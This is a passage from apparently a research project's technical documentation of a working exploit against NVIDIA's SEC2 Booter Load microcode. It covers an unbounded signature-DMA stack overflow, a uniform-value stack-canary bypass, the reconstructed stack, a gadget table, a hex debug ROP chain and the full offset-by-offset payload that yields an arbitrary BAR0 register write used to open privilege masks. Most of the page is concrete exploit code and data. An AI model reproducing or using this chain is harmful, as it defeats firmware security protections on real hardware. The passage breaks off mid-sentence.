# The signature-buffer overflow and the ROP chain

**What this page covers.** The exploit itself: the unbounded signature DMA in SEC2's Booter Load
microcode, why the stack canary does not stop it, the exact stack the overflow lands on, the gadget
vocabulary, the shipping payload's full offset table, and the arbitrary BAR0 write primitive that
falls out of it. Background on the Falcon, the booter image and the driver's calling sequence is on
[The SEC2 Falcon and the Booter Load microcode](falcon-and-booter.md). The masks the primitive is
used to open are on [Privilege Level Masks](privilege-level-masks.md).

**The key result in three sentences.** The booter copies the GSP signature into DMEM with a length
taken verbatim from a host-supplied field and no bound check of any kind, so setting that field to
`0xF800` fills DMEM `0x0800`..`0xFFFF` with attacker-chosen bytes, including the stack-canary guard
global, every saved canary copy and every saved return address. Because the Falcon is
Harvard-architecture, the overflow cannot write instruction memory, so what results is not code
injection but return-oriented programming over the vendor's own signed microcode. The shipping
driver uses that to perform **exactly one arbitrary BAR0 register write per Booter Load fire**, and
re-fires the booter once per register it wants to touch.

---

## 1. The vulnerability

The exploited defect is an unbounded DMA in Booter Load's LS-signature verification.
`booterVerifyLsSignatures_TU10X` at IMEM `0x29C4` performs `lcall 0x0601` (`booterIssueDma_HAL`)
with the DMEM destination fixed and the length taken straight from `WprMeta.sizeOfSignature`. The
destination is set by `mov $r10 0x800` at IMEM `0x37ad`, and the transfer runs through
`dma_copy_block` at IMEM `0x4d4`, called at IMEM `0x37b3`.

| Field | Controlled by | Bounded? |
|---|---|---|
| Buffer contents | the host driver (`pSignatureMemdesc`) | n/a |
| `WprMeta.sizeOfSignature` | the host driver | **no check of any kind** |
| DMEM destination | fixed at `0x0800` | fixed |

The arithmetic is exact and is the whole exploit:

```text
DMA destination  = DMEM 0x0800
shipping length  = 0xF800  (63,488 bytes)
0x0800 + 0xF800  = 0x10000 = the top of DMEM
```

> [!NOTE]
> **The single most important conversion on this page**
>
> **DMEM address = payload offset + `0x800`.** Equivalently, payload offset = DMEM address minus
> `0x800`. Payload offset `0xf754` **is** DMEM `0xFF54`. Payload offset `0x5b40` **is** DMEM
> `0x6340`. Documents that quote `0xF7xx` offsets and documents that quote `0xFFxx` DMEM addresses
> are describing the same bytes in different units, not two different booter builds. A provenance
> review that read the difference as evidence of divergence was mistaken.

Two independent internal cross-checks confirm the base. First, the shipping payload writes its fake
canary at offset `0x5b40`, and `0x5b40 + 0x800 = 0x6340`, the independently established guard
global. Second, offset `0x1100` maps to DMEM `0x1900`, the documented `f100` field-save slot. The
writeups' "highest tail slot 63448 (DMEM `0xFFD8`)" and "SP at `0xFF3C` for payload offset 63292"
reproduce exactly under the same mapping.

> [!CAUTION]
> **The overflow does not give code execution**
>
> Instructions live in IMEM and data in DMEM, in separate 16-bit address spaces. The signature DMA
> lands in DMEM only. What the attacker controls is the set of return addresses on the Falcon call
> stack, so every instruction executed is a fragment of the already-signed, already-authenticated
> `booter_load` image. No unsigned code runs at any point. An early "overwrites IMEM" model was
> corrected on 2026-06-30.

Because the corruption happens *after* the image has passed its own verification, the vulnerable
booter cannot be revoked by a driver update: NVIDIA signed and released the blob, and the validating
keys are fused into the silicon and immutable boot ROM. Confidence on the irrevocability claim is
medium: the reasoning about an immutable root of trust is sound and unchallenged, but it has never
been empirically demonstrated against a hardened driver.

### 1.1 Why the copy length is not caught later

Returning from the overflowed `0x4d4` frame to `0x37b7` rejoins the booter's genuine image
validation (`image_auth_decrypt` at `0x2e80`, AES plus MAC, using WprMeta values in `r2`..`r7`). The
length check there passes naturally because bytes-copied (`0xF800`) equals
`WprMeta.sizeOfSignature` (`0xF800`). The oversized signature is self-consistent.

### 1.2 The measured cliff

The mechanical overrun threshold is guard minus buffer: `0x6340 - 0x800 = 0x5b40`.

| Signature size | Overrun end | Guard | Result |
|---|---|---|---|
| `0x5b00` | DMEM `0x6300` | intact | Card boots. MB0 = `0x96`. |
| `0x5b40` | DMEM `0x6340` | exactly reached | The measured panic boundary. |
| `0x5c00` | DMEM `0x6400` | smashed | Abort. MB0 = `0x47`. |
| `0xF800` | DMEM `0x10000` | smashed, and replaced | The exploit. |

The `0x5B40` boundary was found by binary search on payload size on real hardware, and
`0x6340 - 0x5B40 = 0x800` is how the DMA base was originally derived. The paper's Falcon emulator
brackets the same threshold and states it matches a hardware length sweep.

The 16 KB "overflow cliff" is caused by the canary global sitting in DMEM at that point, not by any
size check in the booter. There is no length validation at all: the booter accepts everything, and
once the write passes DMEM `0x6340` the random guard is destroyed and every returning function
panics. Because DMEM is a 16-bit space, almost 64 kB can be written before reaching the end of the
stack.

### 1.3 The paper's emulator trace

The June 2026 preprint publishes a Falcon-emulator trace of the same booter:

```text
REACHED SIG DMA: buffer=0x800 size=0xf800 overrun-end=0x10000 guard@0x6340

(A) naive non-uniform signature, length 0xf800:
    SIGSZ=0xf800 pc=0x7def spin=0x7def CANARY=True  MB0=0x47   <- stack-check-fail abort
(B) uniform fill with V = 0x4a7:
    SIGSZ=0xf800 pc=0x4a7  spin=0x4a7  CANARY=False MB0=0x31   <- canary passed, PC hijacked to V
```

Both `0x4a7` and `0xf800` appear verbatim as constants in the shipping kernel patch.

---

## 2. Defeating the stack canary

### 2.1 The protection

Every function in Booter Load is canary-protected. A fresh high-entropy guard word is installed at
DMEM `0x6340` during `_start` PHASE 9, taken as the first non-zero word found while scanning DMEM
`0x6330`..`0x6340` after SCP self-provision. Each protected function copies it into its frame on
entry and compares on exit, calling `__stack_chk_fail` at IMEM `0x7dd9` on mismatch. Observed live
canaries from a real 8 GB card: `0xcbee9c9f` at DMEM `0xff94`, `0x3be0f4ab` at `0xffc4`,
`0x941b798d` at `0xfff4`. All three differ, and all three are random per boot.

`__stack_chk_fail` in full:

```asm
7dd9:  mov  $r15 0x6340
       ld b32 $r15 D[$r15]
       add  $sp -0x4
       mov  $r9 $sp
       st b32 D[$r9] $r15
       mov  $r15 0x47
       mov  $r9 0x1000        ; CSB MAILBOX0
       iowrs I[$r9] $r15
7def:  lbra 0x7def            ; spin forever
```

Jumping to `0x7de9` instead of `0x7dd9` prints whatever is in `$r15` to the mailbox, which is the
basis of every debug ROP built during the project.

### 2.2 Why it does not work

The guard global lives in writable data memory reachable by the same overflow it is meant to detect.

> [!NOTE]
> **Defeat by uniformity, not by prediction**
>
> The payload overwrites both the guard global at DMEM `0x6340` **and** every saved-canary slot
> on the stack with the same value `V`. Every epilogue then computes `V == V`, passes, and returns
> into the chain. The value is arbitrary; secrecy and entropy are irrelevant. Reseeding the guard
> from the hardware RNG every boot provides zero protection, because the adversary never has to
> learn it.

There is no RELRO equivalent, no guard page and no MPU read-only mapping. In the paper's emulator
the seed appears as a fixed constant only because the crypto coprocessor is stubbed.

### 2.3 Which value

> [!CAUTION]
> **The shipping guard value is `0xc0deca7e`. It is NOT `0xFACEB13D`.**
>
> `0xc0deca7e` occurs exactly five times in the shipping payload, at payload offsets `0x5b40`,
> `0xf758`, `0xf794`, `0xf7a0` and `0xf7c4` (DMEM `0x6340`, `0xFF58`, `0xFF94`, `0xFFA0`,
> `0xFFC4`). The string `FACEB13D` appears **nowhere** in the shipping tree or in any of the 12
> archived branches. Any document that presents `0xFACEB13D` as "the" canary value is describing
> the clean-room research chains, not the released unlocker.

| Value | Where it is correct |
|---|---|
| `0xc0deca7e` | The shipping `cmpunlocker` driver, master and all 12 branches, byte-identical |
| `0xFACEB13D` | Clean-room research payloads and driverless tooling, convention adopted 2026-07-04 |
| guard address `0x6340` | **Both.** This is the load-bearing fact. |

`0xFACEB13D` ("fake bird") was adopted as a convention after `0xDEADC0DE` and `0xCAFEBABE` were
rejected as overused and possibly present in NVIDIA's own code, which would have made a DMEM dump
ambiguous to read. Because the mechanism is value-independent, both markers work.

The canary-copy slots also differ between the two lineages: the research chain used DMEM `0xFF58`,
`0xFF94`, `0xFFDC`, `0xFFF4`; the shipping chain uses `0xFF58`, `0xFF94`, `0xFFA0`, `0xFFC4`.

### 2.4 The pointer-aliasing alternative

The `0x10b9` multiwrite chains used a different trick entirely: feed the gadgets the constant
`0x6340` as a *pointer* in both operand slots, so the compare loads `D[0x6340]` twice and compares
it against itself. Gadget `0x1fb9` is
`ld b32 $r15 D[$r1]; ld b32 $r9 D[$r2]; mov b32 $r11 $r10; mov b32 $r10 $r0; cmp b32 $r15 $r9;
bra e 0x1fca`, so with `r1 = r2 = 0x6340` the compare is trivially equal and a guard value of 0 is
acceptable. The shipping driver reverted to planting a matching word.

### 2.5 The fill dword

Every dword of the `0xF800` buffer is first written with
`SEC2_POSTBL_TIMING_FILL_DWORD = 0x000004a7U` (15,872 dwords), and only then are the specific slots
overwritten. `0x4a7` is not arbitrary: IMEM `0x000004a7` is a self-loop.

```asm
000004a7:  3e a7 04 00    B lbra 0x4a7
```

If the hijacked PC lands anywhere unintended, the Falcon parks in an observable heavy-secure
self-loop rather than wandering into a fault. It is a diagnostic, not a functional requirement, but
the shipping driver keeps it for exactly that reason.

---

## 3. The stack the overflow lands on

At the moment of overflow the booter is six frames deep. This layout was reconstructed by word-by-
word exfiltration of the real stack from an 8 GB card over 35 boots, and independently derived from
the disassembly. Manual reconstruction alone had failed, because `dma_copy_block` at `0x4d4` is
called from at least 20 places.

| DMEM | Contents | Frame |
|---|---|---|
| `0xFF3C` | SP at overflow; saved r6 = `sizeOfRadix3Elf` | `0x4d4 dma_copy_block` |
| `0xFF40` | saved r5 = `gspFwWprStart[63:32]` | |
| `0xFF44` | saved r4 = `bootBinOffset[31:0]` | |
| `0xFF48` | saved r3 = `sizeOfBootloader` | |
| `0xFF4C` | saved r2 = `gspFwWprStart[31:0]` | |
| `0xFF50` | saved r1 (set to `0x600`, the WprMeta pointer) | |
| `0xFF54` | saved r0 | end of the `mpopaddret $r6` pop block |
| `0xFF58` | canary copy (SP + `0x1c`) | |
| **`0xFF5C`** | **return address. The ROP entry point.** Stock value `0x37b7`. | |
| `0xFF60`-`0xFF90` | frame body, saved r2-r7 = WprMeta FB addresses | `0x3747 image_copy_verify` |
| `0xFF94` | canary | |
| `0xFF98` | return address `0x2740` | |
| `0xFF9C`-`0xFFD0` | frame body (`$sp = 0xFF9C`) | `0x22ba booter_load_wpr_main` |
| `0xFFC4` | canary | |
| `0xFFD4` | return address `0x814e` | |
| `0xFFD8` / `0xFFDC` | wrap frame body | `0x8137 booter_load_wrap` |
| `0xFFE0` | return address `0x80d7` | |
| `0xFFE4`-`0xFFFC` | `main`'s frame | `0x7f82 main` |
| `0xFFEC` | finalize local `D[sp+8]`, stock value `0x1` | feeds `0x001180f8[31:28]` |
| `0xFFF0` | `D[sp+0xc]`, stock `0x0c000000` | |
| `0xFFF4` | `main`'s canary | |
| `0xFFF8` | return address `0x4d0` (`_start` exit) | |

The measured original stack of the 580 booter, exfiltrated from real silicon:

```text
0xff74=0x0        0xff78=0x0        0xff7c=0x0        0xff80=0x8
0xff84=0x600      0xff88=0x0        0xff8c=0x600      0xff90=0x0
0xff94=0xcbee9c9f 0xff98=0x2740     0xff9c=0xfff00000 0xffa0=0x1
0xffa4=0x8        0xffa8=0x8        0xffac-0xffc0=0x0 0xffc4=0x3be0f4ab
0xffc8=0x8700     0xffcc=0xb99e21e  0xffd0=0xd6a262d  0xffd4=0x814e
0xffd8=0xf4bbdeaa 0xffdc=0x98cf4f20 0xffe0=0x80d7     0xffe4=0x0
0xffe8=0x81664b1d 0xffec=0x1        0xfff0=0xc000000  0xfff4=0x941b798d
0xfff8=0x4d0      0xfffc=0x0
(partial, lower: FF60=0x1, FF64=0x520)
```

Two caveats stated by the author of that dump: `0xffd8` is actually saved r0, so a "canary" label
there is wrong; and `FF68`/`FF70` could not be recovered because the exfiltration ROP itself occupies
those slots.

### 3.1 Proving the entry point

The hijacked return address was proven by a controlled experiment on the mailbox: with a large
overfill that normally yields MB0 = `0x31`, replacing payload bytes 63324-63327 with the `panic()`
address changed the mailbox to `0x47`. Offset 63324 = `0xF75C`, and `0xF75C + 0x800 = 0xFF5C`.

### 3.2 The five words that must be patched per boot

Five stack words hold live `WprMeta` values that the overflow destroys and that nothing on the
resume path re-derives.

| DMEM | Register | WprMeta field | Payload offset |
|---|---|---|---|
| `0xFF3C` | r6 | `sizeOfRadix3Elf` | 63292 |
| `0xFF40` | r5 | `gspFwWprStart[63:32]` | 63296 |
| `0xFF44` | r4 | `bootBinOffset[31:0]` | 63300 |
| `0xFF48` | r3 | `sizeOfBootloader` | 63304 |
| `0xFF4C` | r2 | `gspFwWprStart[31:0]` | 63308 |

`gspFwOffset` in r7 is auto-preserved and is not injected. The genuine values are computed at IMEM
`0x3768`-`0x3777` (for example `ld $r2 D[$r10+0x70]`, `ld $r6 D[$r10+0x18]`), spilled by
`mpush $r6` at `0x4d7` and restored by `mpopaddret $r6` at `0x5ff`. Because RM re-allocates WPR2 at
a fresh FB address every boot (`0x277700000` on one run versus a stale baked-in `0x1_f7700000`), a
static capture cannot be reused.

The `WprMeta` struct at DMEM `0x600` itself is never overwritten, because it ends at `0x700`, below
the `0x800` DMA target, and the resume path does re-read it: the pop slot at `0xFF50` is set to
`0x600`, and immediately after the return `0x37b7` does `ld $r9 D[$r1+0x50]`. Only r2-r6 are
frame-restored copies that cannot be re-derived.

> [!NOTE]
> **Open problem: register assignment of the WprMeta spill**
>
> Two of three sources give `0xFF3C` = saved r6 = `sizeOfRadix3Elf 0x01d09ea0` and `0xFF4C` =
> saved r2 = `gspFwWprStart 0xf7700000`. A third gives the reverse and is internally muddled. The
> majority reading is used above. Settled by re-reading the pop order in the `0x22ba` prologue.

---

## 4. Falcon stack mechanics

Getting these wrong silently kills a chain, usually in `__stack_chk_fail`.

- **`mpush $rN` pushes r0 first at the highest address**, descending to rN last at the lowest
  address where SP points. `mpop` / `mpopaddret` is strict LIFO: rN comes off the lowest slot first,
  r0 off the highest slot last. To plant a value for rK in a block whose top word is at address T,
  write it at `T - 4*K`.
- **`mpopaddret $rN imm`** restores `$r0` down to `$rN`, and the immediate reserves extra bytes that
  normally hold the stack canary, with the return address above that. Total SP advance is
  `(N+1)*4 + imm + 4`: the `$r6 0x4` form
  advances SP by `0x24` (9 dwords: r0-r6, one reserved dword, return address), the `$r3 0x4` form
  that ends `0x10aa` by `0x18`, and the `$r2 0x4` form by `0x14` (5 dwords). The shipping payload
  fixes all three: the `0x4d4` epilogue leaves SP at `0xFF60`, the `0x0cc8` `$r3` epilogue takes its
  return address from `0xFF74` (`0x00001fbd`), and the `0x1fca` `$r2` epilogue takes its return
  address from `0xFF88` (`0x000010aa`). The `0x20` and `0x10` figures recorded by the silicon `0x47`
  mailbox probes count the register block plus the immediate and stop short of the return-address
  pop. envytools has no documentation entry for `mpopaddret` at all, only for `ret`.
- **The stack pointer can be advanced but never rewound.** Every function-tail `ret` or
  `mpopaddret` increments it, and one exists for every increment from `$sp+4` to `$sp+40`. A bare
  `ret` increments `$sp` by 4. **No SP-lowering gadget exists in the booter**: `mov $sp $r9` appears
  only in `_start` (which re-runs boot) and all `mpush` / `add $sp -N` forms live inside function
  prologues.
- **The booter clears r0-r16 at entry**, so a chain must set up all its own register state within a
  single load. Confidence: medium; consistent with the working chain design but never separately
  confirmed.
- **`r0`-`r8` are stack-poppable; `r9`-`r15` are not.** `mpopaddret $rN` never exceeds N = 8. This
  is the constraint that forces the elevator gadgets, because the write engine takes its arguments
  in `r10`/`r11`.

Setter counts from the machine-generated gadget atlas (mov / ld / zero), built by interprocedural
reach analysis over `booter_load_ga100_dbg_seccode.fuc5.asm` and listing a gadget only if the target
register still holds the set value at the `ret`:

| Reg | mov | ld | zero | | Reg | mov | ld | zero |
|---|---|---|---|---|---|---|---|---|
| r0 | 78 | 2 | 3 | | r8 | 3 | 0 | 2 |
| r1 | 23 | 3 | 5 | | r9 | **0** | 131 | 0 |
| r2 | 25 | 4 | 2 | | r10 | 48 | - | 28 |
| r3 | 17 | 6 | 0 | | r11 | 6 | 3 | 9 |
| r4 | 15 | 4 | 2 | | r12 | 7 | 11 | 2 |
| r5 | 10 | 5 | 2 | | r13 | 10 | 6 | 5 |
| r6 | 3 | 5 | 1 | | r14 | 18 | 10 | 22 |
| r7 | 2 | 3 | 0 | | r15 | **0** | 131 | 0 |

Almost every gadget path runs a canary compare requiring `r15 == r9`. The atlas documents three
precondition classes: `canary(r15==r9)`, `via-call` (the path executes a real subfunction verified
not to clobber the target but still needing its own state), and `data-branch` (a conditional branch
on a register value lies on the path). Reach analysis guarantees the register is *preserved*, not
that an arbitrary value is reachable: `derefs-r11` means r11 is used as a pointer and must be a
valid writable DMEM address. Only a handful of gadgets have no precondition at all, for example
`0x19bc` (`$r3 <- $r12`, terminator `ret`).

Multi-pop entry points extracted from the binary:

| Pops to | Addresses (partial) |
|---|---|
| `$r0` | `0x1ba0`, `0x1c0b`, `0x1cde`, `0x1d9f`, `0x202d`, `0x2089`, and 10 more |
| `$r1` | `0x0bc6`, `0x0c79`, `0x1061`, `0x1218`, `0x1443`, `0x1547`, and 18 more |
| `$r2` | `0x09d7`, `0x0b25`, `0x0ef0`, `0x0f88`, `0x12e7`, `0x1fca`, and 6 more |
| `$r3` | `0x0b99`, `0x0cc8`, `0x0f36`, `0x10ff`, `0x13a4`, `0x21f1`, and 7 more |
| `$r4` | `0x08fe`, `0x0a9e`, `0x2a62`, `0x3b53`, `0x4765`, `0x7c62`, and 1 more |
| `$r5` | `0x0d63`, `0x0e49`, `0x1b41`, `0x29b5`, `0x7a61`, `0x85ce`, and 1 more |
| `$r6` | `0x05ff`, `0x07d9`, `0x28a9`, `0x4674`, `0x60c5` |
| `$r7` | `0x38c3`, `0x7977`, `0x84cd` |
| `$r8` | `0x071a`, `0x22b7`, `0x3743`, `0x3c8c`, `0x4484`, `0x5ccb`, and 2 more |

One further mechanical property, tested and confirmed: **the ROP stack can legally extend past DMEM
`0xFFFF` and wrap to `0x0000`**, so chain length is not capped by the top of DMEM. It did not fix
the `0x65` error it was proposed for. A competing later analysis holds that when a geometry write
shifts the stack, a finalize local pushed past `0xFFFF` "wraps and becomes uncontrollable". Both may
be true of different slots; nobody stated the boundary, so treat wrapping as usable for chain
extension and unusable for values `main` must read back.

---

## 5. The arbitrary BAR0 write primitive

### 5.1 The engine

`reg_write_indirect` at IMEM `0x10aa` is the whole primitive. Its open-driver symbol is
`_acrlibBar0RegWrite_TU10X`, and it is **byte-for-byte the same code** as that routine at `0xd10` in
the Turing acrlib: side by side the encodings match
(`f4 30 fc / f9 32 / 83 40 .. 00 / bf 39 / b2 a0 / b2 b1 / fe 42 01 / 90 22 10 / a0 29 / …`),
differing only in the canary DMEM address (`0x6340` on GA100 versus `0x940` on TU10X) and the call
targets. Identifying it that way is how the primitive was found.

What it does, in order:

1. Load the canary from `D[0x6340]` into `$r9` (`mov $r3 0x6340`, `ld b32 $r9 D[$r3]`).
2. `0x10b5` / `0x10b7`: `mov b32 $r0 $r10`, `mov b32 $r1 $r11` (marshal arguments).
3. From `0x10b9`: save the canary to the stack (`mov $r2 $sp`, `add $r2 0x10`, `st D[$r2] $r9`), then
   acquire the mailbox mutex with `lcall 0x1064` (`mailbox_wait_ready`).
4. `csb_write(I[0x1c100] = address)`, `csb_write(I[0x1c200] = value)`,
   `csb_write(I[0x1c000] = 0x800000f2)`, all via `csb_write` at `0x8224`.
5. Read back `0x1c000`, wait ready again.
6. Verify the saved canary against `D[0x6340]`.
7. Return via `mpopaddret $r3 0x4` at `0x10ff`.

`mailbox_wait_ready` at `0x1064` polls `I[0x1c000]` bits [14:12]: 0 = done, 1 = keep spinning,
anything else = error `0x15` then exit. The read counterpart is `reg_read_indirect` at `0x1196`,
with command word `0x800000f1`.

### 5.2 Two entry points, two register conventions

This reconciles a long-standing apparent contradiction in the source material.

| Entry | Arguments | Used by |
|---|---|---|
| `0x10aa` (full) | `r10` = target BAR0 address, `r11` = value | **The shipping driver.** |
| `0x10b9` (mid) | `r0` = address, `r1` = value | The driverless `refire_chain*.py` tooling. |

Entering at `0x10b9` skips the `mov r0,r10` / `mov r1,r11` copies at `0x10b5`/`0x10b7`, so the ROP
can supply the operands directly off the stack. Both reach the same `iowrs I[0x1c…]` store. Both
descriptions in the source material are correct for their own entry point.

> [!CAUTION]
> **The shipping payload uses `0x000010aa`, not `0x10b9`**
>
> The value `0x000010aa` is written at payload offset `0xf788` (DMEM `0xFF88`) in
> `driver/patches/0001-sec2-postbl-plm-ss-cfg.patch`, and the string `10b9` appears **nowhere** in
> the shipping tree or in any of the 12 branches. Any claim that `0x10b9` is "used by every
> working payload including the one compiled into the shipping driver patch" is self-contradictory
> and is corrected here. The `0x10b9` self-chain is a clean-room and driverless-tool construct
> only.

### 5.3 Costs

| Path | Stack per write | Notes |
|---|---|---|
| `0x10aa` full entry | `+0x10` of main-SP shift | Shipping. Needs elevators to load r10/r11. |
| `0x10b9` mid entry | `+0x18` = 24 bytes per write | Self-chains through the `mpopaddret $r3 0x4` epilogue. Frame shape `[r0=canary addr][r1=0][r2=value][r3=address][canary][RA]`. |
| `0x8224` `csb_write` directly | ~0x60 bytes per write | Works, but requires hand-rolling address, data, command and poll per register. More frames for no benefit. |

The `+0x10` versus `+0x18` figures come from a 2026-07-06 analysis and carry medium confidence.

`csb_write` itself is a usable direct-write gadget and is worth reading, because it also shows the
fail-closed idiom:

```asm
8224:  add $sp -0x4
8228:  ld b32 $r15 D[$r15]
822a:  add $sp -0x4
822d:  mov $r9 $sp
8230:  st b32 D[$r9] $r15
8232:  iowrs I[$r10] $r11        ; writes to Falcon I/O, NOT external BAR0
8235:  mov $r9 0x9100
8239:  iords $r9 I[$r9]
823c:  shr b32 $r9 0x1f
823f:  bra b32 $r9 0x1 ne 0x824b
8243:  mov $r10 0x15
8245:  lcall 0x1d0f
8249:  exit
```

The correct elevator gadgets for calling `0x8224` from a chain are `0x1fb9` and `0x1fbd`.

### 5.4 First demonstration

Arbitrary BAR0 register write from an HS ROP chain was first demonstrated on real 8 GB silicon on
2026-07-03: register `0x0014a0` went `0x00000000` to `0xcafebabe`, with the mailbox reading `0x47`
because the chain deliberately terminated in `panic()`. A second researcher independently reported
writing arbitrary bytes to arbitrary I/O addresses, verified by writing to `0x1000` and observing it
in the mailbox.

> [!WARNING]
> **Read-back is not free**
>
> The host at PL0 cannot read many of these registers back, returning `0xbadf5040` / `0xbadf50xx`.
> That is a priv-blocked read indication, **not** a stored poison value. Read-back verification of
> an HS write needs the in-Falcon read gadget `0x1196` or the host-visible mailbox alias. Once the
> relevant PLM is open, the host can read normally, which is what the shipping driver relies on.

### 5.5 Which registers the primitive can reach

Confirmed working: FEAT PLM `0x00823804`; WPR2 `0x001FA824`; and in the shipping driver, WPR_CFG
`0x001fa7cc` opened to the partial value `0xfffff0ff`, FBPA `0x009a0148` and WPR `0x001fa7c4`.

> [!NOTE]
> **Open problem: reported failures on neighbouring WPR registers**
>
> One single-source list reports the write confirmed *not* working for WPR1_HI `0x001FA820`,
> WPR1_LO `0x001FA81C` and WPR_Mask `0x001FA7CC` at the time of that test, yet the shipping driver
> successfully opens `0x001fa7cc` through the same primitive. Either the earlier test used a
> different value or a different chain, or the `0xfffff0ff` partial open succeeds where a full
> `0xffffffff` open does not. Confidence in the failure list: medium. Settled by a fire that
> attempts `0x001fa7cc = 0xffffffff` with read-back, alongside the earlier test's exact payload.

A separate structural limit is real and independent of the primitive: the SEC2 ROP only opens PLMs
whose `SOURCE_ENABLE` field whitelists sec2-HS. `0x00823b00` was observed rejecting the chain for
that reason. See [Privilege Level Masks](privilege-level-masks.md).

---

## 6. The gadget vocabulary

Every address below is **IMEM**, and every one is a fragment of the same signed `booter_load` image.

| IMEM | What it is | Role in chains |
|---|---|---|
| `0x04a7` | `lbra 0x4a7` self-loop | Fill dword; spin-park that stays in HS |
| `0x04d0` | `_start` exit | Terminator |
| `0x04d4` | `dma_copy_block` | The overflowing frame; epilogue `mpopaddret $r6` at `0x5ff` |
| `0x0cbd` | `mov $r10 $r0` inside `regblock_read_guarded (0x0c7c)` | Elevator |
| `0x0ccb` | `regtable_rw_indexed`, ends `mpopaddret $r5 0x8` | Also read as the ACR mutex release paired with the `0xd66` acquire |
| `0x10aa` | `reg_write_indirect` full entry | **The write** (r10 = addr, r11 = value) |
| `0x10b9` | mid entry | Self-chaining write (r0 = addr, r1 = value) |
| `0x10ff` | `mpopaddret $r3 0x4` | `0x10aa`'s epilogue; makes writes self-chain |
| `0x1b41` | `mpopaddret $r5 0x4` | |
| `0x1b44` | `set_1180f8_bit24()` | Pops four words; mutex-free gadget in re-entrant chains |
| `0x1c0e` | `set_1180f8_top_nibble()` | Finalize; releases the ACR mutex via the `0xccb` call |
| `0x1d9f` | `mpopaddret $r0 0x4` | Stack eater |
| `0x1fb9` | `ld $r15 D[$r1]; ld $r9 D[$r2]; mov $r11 $r10; mov $r10 $r0` | Elevator + canary alias |
| `0x1fbd` | `mov $r11 $r10; mov $r10 $r0` inside `read_820344_820348 (0x1f92)` | **Elevator.** Used 3× in the shipping payload. |
| `0x1fca` | pops `$r0,$r1,$r2` | Elevator feed |
| `0x22ba` | `booter_load_wpr_main` | Rejoin |
| `0x27fa` | rejoin point inside `0x22ba` | See dead ends |
| `0x28a9` | `mpopaddret $r6 0xc` | |
| `0x2d5a` / `0x2d75` | memcpy trampoline (`$r12 = 0x10`, `lcall 0xe85`) | DMEM exfiltration |
| `0x582d` | inside `pka_ready_check (0x580f)`: moves `$r0 -> $r12`, calls `regblock_read_guarded` | Tail |
| `0x7de9` | inside `__stack_chk_fail` | Prints `$r15` to MAILBOX0. Every debug ROP. |
| `0x7dd9` | `__stack_chk_fail` entry | Writes `0x47`, hangs |
| `0x7e76` | `secure_teardown` | Never returns; nothing can be appended after it |
| `0x7f2f` | exit gadget inside `secure_teardown` | **The shipping terminator** |
| `0x810d` / `0x8119` / `0x8137` | sites in `main` / `booter_load_wrap` | Rejoin |
| `0x814e` | return into `booter_load_wrap` | Light rejoin |
| `0x815a` | canary-check tail / stack eater | Used 2× in the shipping payload |
| `0x8224` | `csb_write` | Direct Falcon-I/O write |
| `0x8262` | bare `ret` | Alignment filler |
| `0x8e18` | clean-tail unwind gadget | |
| `0xffbc` | intermediate unwind gadget | |

> [!NOTE]
> **Open problem: what several shipping-tail words actually do**
>
> `0x00000cbd` (twice), `0x00008e18`, `0x0000ffbc`, `0x0000582d`, `0x00000003` at DMEM `0xFFD8`,
> and the two `0x0000815a` entries have no published gadget annotation. On address range alone,
> `0x0000ffbc` and probably `0x00008e18` look like DMEM pointer operands rather than IMEM code
> addresses, since the booter image runs to roughly `0x8200`; that is an inference, not
> established. Also unexplained: `0x00000007` at DMEM `0x1900` beyond its resetPLM effect, and the
> fill dword `0x000004a7`. Next step: run the existing `register_gadget_atlas.md` generator over
> these addresses, since the atlas format already records preconditions and terminators. A single
> pass over the annotated listing should resolve all of them.

A minimal debug ROP that was confirmed working on silicon, printing DMEM `0x800`-`0x804` to the
mailbox and then hanging (gadgets `0x0bc6`, `0x0bb9`, `0x7de9`):

```text
c6 0b 00 00  00 08 00 00  00 08 00 00  55 55 55 55
b9 0b 00 00  55 55 55 55  55 55 55 55  55 55 55 55
e9 7d 00 00
```

Place at payload offset **63324**; canaries must be handled at **23360** and **63320**. The
`0x55555555` is distinguishable filler, not the fake canary.

---

## 7. The shipping payload, byte for byte

Generated by `_kgspSec2PostblTimingFillPayload()` in
`driver/patches/0001-sec2-postbl-plm-ss-cfg.patch`. Every dword of the buffer is set to
`0x000004a7`, then **24** dwords are planted with `_kgspSec2PostblTimingPutU32()`.

| Payload offset | DMEM | Value | Role |
|---|---|---|---|
| all | `0x0800`-`0xFFFF` | `0x000004a7` | fill / spin-park |
| `0x1100` | `0x1900` | `0x00000007` | `f100_field_save_restore` gate; leaves resetPLM `0xff` |
| `0x5b40` | `0x6340` | `0xc0deca7e` | **the guard global itself** |
| `0xf754` | `0xFF54` | *writeValue* | BAR0 write data parameter |
| `0xf758` | `0xFF58` | `0xc0deca7e` | frame canary |
| `0xf75c` | `0xFF5C` | `0x00000cbd` | **first return address** (elevator) |
| `0xf76c` | `0xFF6C` | *writeAddr* | BAR0 write address parameter |
| `0xf774` | `0xFF74` | `0x00001fbd` | elevator |
| `0xf780` | `0xFF80` | `0x00000000` | |
| `0xf788` | `0xFF88` | `0x000010aa` | **the write gadget** |
| `0xf78c` | `0xFF8C` | `0x0000815a` | tail base |
| `0xf790` | `0xFF90` | `0x00008e18` | |
| `0xf794` | `0xFF94` | `0xc0deca7e` | frame canary |
| `0xf798` | `0xFF98` | `0x0000815a` | |
| `0xf79c` | `0xFF9C` | `0x00000000` | |
| `0xf7a0` | `0xFFA0` | `0xc0deca7e` | frame canary |
| `0xf7a4` | `0xFFA4` | `0x00001fbd` | elevator |
| `0xf7b0` | `0xFFB0` | `0x0000ffbc` | |
| `0xf7b8` | `0xFFB8` | `0x0000582d` | |
| `0xf7c4` | `0xFFC4` | `0xc0deca7e` | frame canary |
| `0xf7c8` | `0xFFC8` | `0x00000cbd` | |
| `0xf7d8` | `0xFFD8` | `0x00000003` | |
| `0xf7e0` | `0xFFE0` | `0x00001fbd` | elevator |
| `0xf7f4` | `0xFFF4` | `0x00000ccb` | ACR mutex release (contested reading) |
| `0xf7f8` | `0xFFF8` | `0x00007f2f` | **terminator, into `secure_teardown`** |

Thirteen distinct non-canary, non-operand words appear: `0x4a7`, `0x7`, `0xcbd` (×2), `0x1fbd` (×3),
`0x0` (×2), `0x10aa`, `0x815a` (×2), `0x8e18`, `0xffbc`, `0x582d`, `0x3`, `0xccb`, `0x7f2f`.

> [!NOTE]
> **Byte-identical everywhere**
>
> This payload is identical across shipping `master` and all 12 archived branches: the same 24
> `PutU32` calls, the same offsets, the same values, verified by checksum and by grepping
> `0xc0deca7eU`, which occurs exactly 5 times in every copy. It is also byte-identical across the
